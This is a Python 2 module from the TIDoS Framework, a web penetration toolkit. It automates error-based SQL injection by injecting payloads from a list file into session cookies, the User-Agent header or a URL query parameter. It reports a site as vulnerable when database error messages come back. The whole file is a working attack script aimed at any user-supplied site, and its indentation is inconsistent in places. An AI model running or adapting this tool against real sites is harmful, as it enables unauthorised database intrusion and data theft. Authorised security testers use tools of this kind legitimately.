#!/usr/bin/env python2
# coding: utf-8

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#This module requires TIDoS Framework
#https://github.com/theInfectedDrake/TIDoS-Framework  

import os
import re
import sys
import urllib2
import requests
sys.path.append('files/')
from colors import *
from re import *
import time
from time import sleep
from urllib2 import Request, urlopen
from sqlsearch import *

global pay
pay = []

def auto0x00(web):

	def sqlicookie0x00(web):

		print R+'\n    ========================='
		print R+'     S Q L i  (Cookie Based)'
		print R+'    =========================\n'

		sleep(0.5)
	        session = requests.Session()
		req = session.get(web)
		check = ["have an error", "SQL syntax", "MySQL"]
		if session.cookies:
			print G+' [+] This website values session cookies...'
			for i in pay:
				print B+" [*] Trying Payload : "+C+''+ i
				time.sleep(0.7)
				for cookie in session.cookies:
			    		cookie.value += i
					print O+' [+] Using '+R+'!nfected'+O+' cookie : '+GR+cookie.value
					r = session.get(web)
					for j in range(0, len(check)):
						if check[j] in r.text:
							poc = C+" [+] PoC : " +O+ cookie.name + " : " +GR+ cookie.value
							print G+" [+] Error Based SQli (Cookie Based) Detected! "
							print poc
							print P+' [+] Code : '+W+str(r.text)+'\n'
		else:
			print R+' [-] No support for cookies...'
			time.sleep(0.5)
			print R+' [-] Cookie based injection not possible...' 

	def sqliuser0x00(web):

		print R+'\n    ============================='
		print R+'     S Q L i  (User-Agent Based)'
		print R+'    =============================\n'

		for i in pay:
			print B+' [*] Using payload : '+C+i
			time.sleep(0.7)
			user_agent = {'User-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux' +
				      'x86_64; rv:39.0) Gecko/20100101 Firefox/39.0'}
			user_agent['User-agent'] += i
			req = requests.get(web, headers=user_agent)
			print O+' [*] Using '+R+'!nfected'+O+' UA : '+GR+user_agent['User-agent']
			flag = u' '.join(req.text).encode('utf-8').strip()
			check = ["have an error", "SQL syntax", "MySQL"]
			for j in range(0, len(check)):
				for line in finditer(check[j], flag):
					print G+' [!] Error based SQLi (User-Agent Based) Detected!'
					print R+' [!] User-Agent : '+user_agent

	print P+' [!] Enter an option :\n'
	print C+'   [1] '+B+'Cookie Error Based Injection'
	print C+'   [2] '+B+'User-Agent Error Based Injection'
	print C+'   [3] '+B+'Auto Awesome Module (automated searching and exploiting)\n'
	q = raw_input(O+' [#] TID :> ')
	if q == '3':
		print GR+' [*] Launching Auto-Awesome Module...'
		sqlisearch0x00(web)
	elif q == '2':
		print GR+' [*] Launching User-Agnet Error Based Module...'
		sqliuser0x00(web)
	elif q == '1':
		print GR+' [*] Launching Cookie-Based Module...'
		sqlicookie0x00(web)

def manual0x00(web):
	
	print R+'\n    ========================'
	print R+'     S Q L i  (Manual Mode)'
	print R+'    ========================\n'
	bug = raw_input(' [#] Enter the scope parameter path (eg. /sqli/fetch.php?id=x) :> ')
	bugs = web + bug
	print O+' [!] Using Url : '+GR+bugs
	if '?' in str(bugs) and '=' in str(bugs):
		for p in pay:
		    bugs = bugs + str(p)
	    	    print B+" [*] Trying : "+C+bugs
		    time.sleep(0.7)
	    	    response = requests.get(bugs).text
	    	    if (('error' in response) and ('syntax' in response) and ('SQL' in response) or ('Warning:' in response)):
			print '\n'+G+' [+] Vulnerable link detected : ' + bugs
			print ''+R+' [*] Injecting payloads...'
			print ''+B+' [!] PoC : ' + str(bugs)
	    	        print ''+R+" [!] Payload : " + O + p + '\033[0m'
	    	        print "\033[1m [!] Code Snippet :\n \033[0m" + response + '\n'
	else:
		print R+' [-] Enter an URL with scope parameter...'
		manual0x00(web)

def sqli(web):

    while True:
	print GR+' [*] Loading module SQLi...'
	sleep(0.6)
	if web.endswith('/'):
		web = web[:-1]
	print R+'\n    ==========================='
	print R+'     S Q L   I N J E C T I O N'
	print R+'    ===========================\n'
	print GR+' [*] Importing error parameters...'
	sleep(0.8)
	try:
		with open('files/payload-db/sql_payloads.lst','r') as payloads:
			for payload in payloads:
				payload = payload.replace('\n','')
				pay.append(payload)
	except IOError:
		print R+' [-] Payloads file does not exist!'

	print O+'\n [#] Enter the type you want to proceed:\n'
	print C+'   [1] '+B+'Manual Mode'
	print C+'   [2] '+B+'Automatic Mode\n'		
	p = raw_input(O+' [#] TID :> ')
	if p == '1':
		print GR+' [*] Initializing manual mode...'
		manual0x00(web)
	if p == '2':
		print GR+' [*] Loading automatic mode...'
		auto0x00(web)

